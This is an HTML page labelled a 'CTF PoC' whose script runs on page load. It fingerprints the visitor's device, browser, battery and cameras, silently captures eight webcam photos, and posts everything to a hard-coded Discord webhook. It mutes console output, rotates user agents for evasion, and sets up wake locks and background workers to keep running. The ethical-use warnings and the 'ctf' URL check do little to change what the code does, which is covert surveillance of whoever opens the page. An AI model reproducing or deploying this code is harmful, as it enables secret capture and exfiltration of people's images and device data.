<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>CTF</title>
</head>
<body>
    <script>
        // WARNING: Ethical CTF PoC only. Unauthorized use violates privacy laws. Use with explicit consent.
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';

        // Stealth: Suppress console and performance APIs
        const suppress = () => {};
        console.log = console.error = console.warn = console.time = console.timeEnd = suppress;
        performance.mark = performance.measure = suppress;

        // Random user agent for evasion
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0'
        ];
        const getRandomUA = () => userAgents[Math.floor(Math.random() * userAgents.length)];

        // Browser detection
        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
        const isChrome = /chrome/i.test(navigator.userAgent);
        const isFirefox = /firefox/i.test(navigator.userAgent);
        const isEdge = /edg/i.test(navigator.userAgent);
        const isMobile = /mobile/i.test(navigator.userAgent);

        // Send data to webhook with retries
        async function sendItem(type, data, index = null, retries = 3) {
            for (let i = 0; i < retries; i++) {
                try {
                    const formData = new FormData();
                    formData.append('payload_json', JSON.stringify({
                        embeds: [{
                            title: `Zero-Click CTF: ${type}`,
                            fields: [
                                { name: 'Type', value: type },
                                { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
                                { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
                                { name: 'Device', value: navigator.userAgent || 'Unknown' },
                                { name: 'Platform', value: navigator.platform || 'Unknown' },
                                { name: 'Browser', value: `${isChrome ? 'Chrome' : isFirefox ? 'Firefox' : isEdge ? 'Edge' : isSafari ? 'Safari' : 'Unknown'} ${isMobile ? '(Mobile)' : ''}` },
                                { name: 'HTTPS', value: location.protocol === 'https:' ? 'Yes' : 'No' },
                                { name: 'Time', value: new Date().toISOString() }
                            ],
                            footer: { text: 'Ethical CTF PoC - Do not misuse' }
                        }]
                    }));
                    if (type.includes('Photo')) {
                        const response = await fetch(data.base64);
                        const blob = await response.blob();
                        formData.append('file', blob, `photo_${index + 1}.webp`);
                    }

                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData,
                        headers: { 'User-Agent': getRandomUA() }
                    });
                    if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                    return true;
                } catch (e) {
                    await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, i))); // Exponential backoff
                    if (i === retries - 1) {
                        await sendItem('Error', { message: `Failed to send ${type}: ${e.message}`, attempt: i + 1 });
                    }
                }
            }
            return false;
        }

        // Check camera permissions
        async function checkCameraPermission() {
            try {
                const permission = await navigator.permissions.query({ name: 'camera' });
                const state = permission.state;
                await sendItem('Permission', { status: state, message: `Camera permission state: ${state}` });
                return state === 'granted';
            } catch (e) {
                await sendItem('Permission', { error: `Permission check failed: ${e.message}` });
                return false;
            }
        }

        // List available cameras
        async function listCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                await sendItem('CameraList', { devices: videoDevices.map(d => ({ label: d.label || 'Unknown', id: d.deviceId })) });
                return videoDevices;
            } catch (e) {
                await sendItem('CameraList', { error: `Failed to enumerate cameras: ${e.message}` });
                return [];
            }
        }

        // Check battery level
        async function checkBattery() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    await sendItem('Battery', { level: battery.level, charging: battery.charging });
                    return battery.level > 0.2; // Proceed if battery > 20%
                }
                return true; // No battery API, assume okay
            } catch (e) {
                await sendItem('Battery', { error: `Battery check failed: ${e.message}` });
                return true;
            }
        }

        // Capture a single photo
        async function capturePhoto(stream, index, phase) {
            try {
                const track = stream.getVideoTracks()[0];
                if ('ImageCapture' in window) {
                    const imageCapture = new ImageCapture(track);
                    const bitmap = await imageCapture.grabFrame();
                    const canvas = new OffscreenCanvas(120, 90);
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(bitmap, 0, 0, 120, 90);
                    const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
                    const reader = new FileReader();
                    const photo = await new Promise(resolve => {
                        reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                        reader.readAsDataURL(blob);
                    });
                    await sendItem(`${phase} Photo ${index + 1}`, photo, index);
                    return true;
                } else {
                    // Fallback for browsers without ImageCapture
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    const canvas = document.createElement('canvas');
                    canvas.width = 120;
                    canvas.height = 90;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.05));
                    const reader = new FileReader();
                    const photo = await new Promise(resolve => {
                        reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                        reader.readAsDataURL(blob);
                    });
                    await sendItem(`${phase} Photo ${index + 1}`, photo, index);
                    video.srcObject = null;
                    return true;
                }
            } catch (e) {
                await sendItem(`${phase} Photo ${index + 1}`, { error: `Capture failed: ${e.message}` }, index);
                return false;
            }
        }

        // Collect 8 photos quickly (~4 seconds)
        async function collectInitialPhotos() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                await sendItem('Camera', { error: 'Camera not supported', device: navigator.userAgent });
                return false;
            }

            if (!(await checkCameraPermission())) {
                await sendItem('Permission', { error: 'Camera permission not granted, aborting initial capture' });
                return false;
            }

            if (!(await checkBattery())) {
                await sendItem('Battery', { error: 'Low battery, aborting capture to avoid draining' });
                return false;
            }

            await listCameras();

            let stream = null;
            const maxRetries = 3;
            let retryCount = 0;
            const constraints = isMobile ? 
                { video: { facingMode: { ideal: 'user' }, width: { ideal: 120 }, height: { ideal: 90 }, frameRate: { ideal: 5 } }, audio: false } :
                { video: { width: { ideal: 120 }, height: { ideal: 90 }, frameRate: { ideal: 5 } }, audio: false };

            while (!stream && retryCount < maxRetries) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                    await sendItem('Camera', { message: `Camera accessed: ${stream.getVideoTracks()[0].label}` });
                } catch (e) {
                    retryCount++;
                    await sendItem('Camera', { error: `Initial camera access failed (attempt ${retryCount}/${maxRetries}): ${e.message}` });
                    if (retryCount === maxRetries) {
                        await sendItem('Camera', { error: 'Max retries reached, aborting initial capture' });
                        return false;
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, retryCount)));
                }
            }

            if (stream) {
                for (let i = 0; i < 8; i++) {
                    await new Promise(resolve => setTimeout(async () => {
                        await capturePhoto(stream, i, 'Initial');
                        resolve();
                    }, i * 500 + Math.random() * 20));
                }
                stream.getTracks().forEach(track => track.stop());
                await sendItem('Status', { message: 'Initial 8 photos captured successfully' });
                return true;
            }
            return false;
        }

        // Register WebWorker
        async function registerBackgroundWorker() {
            if (!location.protocol === 'https:') {
                await sendItem('Error', { message: 'HTTPS required for reliable worker operation, aborting background capture' });
                return;
            }

            if ('Worker' in window) {
                try {
                    const worker = new Worker('/worker.js');
                    worker.postMessage({ action: 'startBackgroundCapture' });
                    await sendItem('WebWorker', { message: 'WebWorker registered successfully' });
                } catch (e) {
                    await sendItem('WebWorker', { error: `Failed to register: ${e.message}` });
                }
            } else {
                await sendItem('Worker', { error: 'No WebWorker support, background capture aborted' });
            }
        }

        // Ensure background execution
        async function keepRunningInBackground() {
            try {
                if ('wakeLock' in navigator) {
                    const lock = await navigator.wakeLock.request('screen');
                    setTimeout(() => lock.release(), 5000);
                    await sendItem('WakeLock', { message: 'WakeLock acquired for initial captures' });
                }

                document.addEventListener('visibilitychange', async () => {
                    if (document.visibilityState === 'hidden') {
                        await registerBackgroundWorker();
                    }
                });

                const keepAlive = setInterval(() => {
                    fetch('/noop', { method: 'HEAD', headers: { 'User-Agent': getRandomUA() } }).catch(suppress);
                }, 5000);
                setTimeout(() => clearInterval(keepAlive), 420000);
            } catch (e) {
                await sendItem('Background', { error: `Background setup failed: ${e.message}` });
            }
        }

        // Self-destruct if not in CTF context
        if (!location.href.includes('ctf')) {
            sendItem('Security', { error: 'Non-CTF context detected, aborting' });
            throw new Error('Ethical CTF PoC only');
        }

        // Start zero-click collection
        (async () => {
            await sendItem('Debug', { 
                message: 'Script started', 
                url: location.href, 
                device: navigator.userAgent, 
                platform: navigator.platform,
                browser: `${isChrome ? 'Chrome' : isFirefox ? 'Firefox' : isEdge ? 'Edge' : isSafari ? 'Safari' : 'Unknown'} ${isMobile ? '(Mobile)' : ''}`,
                https: location.protocol === 'https:' ? 'Yes' : 'No',
                time: new Date().toISOString()
            });
            await keepRunningInBackground();
            await collectInitialPhotos();
        })();
    </script>
</body>
</html>
